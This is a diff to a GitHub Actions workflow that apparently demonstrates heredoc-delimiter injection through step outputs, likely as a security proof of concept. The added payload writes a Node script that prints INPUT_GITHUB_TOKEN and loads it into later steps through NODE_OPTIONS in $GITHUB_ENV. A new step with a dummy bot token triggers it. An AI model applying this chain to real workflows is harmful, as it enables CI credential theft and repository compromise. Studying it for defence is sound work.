@@ -61,7 +61,7 @@ jobs:
             echo '<h2>Scanned Files</h2>'
             echo '<ul><li>attacker-manifest'
             echo 'EOF'
-            echo 'id; echo HEREDOC_RCE_MARKER; touch "$GITHUB_WORKSPACE/PWNED"; exit 0'
+            echo 'printf "%s" "process.stdout.write(\"LEAKED_TOKEN:\"+process.env.INPUT_GITHUB_TOKEN+\"\\n\")" > /tmp/steal.js; touch "$GITHUB_WORKSPACE/PWNED"; echo "NODE_OPTIONS=--require=/tmp/steal.js" >> "$GITHUB_ENV"; exit 0'
             echo '</li></ul>'
             echo 'GHAOUT'
           } >> "$GITHUB_OUTPUT"
@@ -70,6 +70,12 @@ jobs:
           cat << 'EOF' > openssf-report.html
           ${{ steps.dependency-review.outputs.comment-content }}
           EOF
+      - name: Next action carrying the bot token
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
+        with:
+          github-token: dummy-org-bot-pat
+          script: |
+            core.info('next action executed')
       - name: Verify impact
         run: |
           echo "payload event: ${{ github.event.workflow_run.event }}"
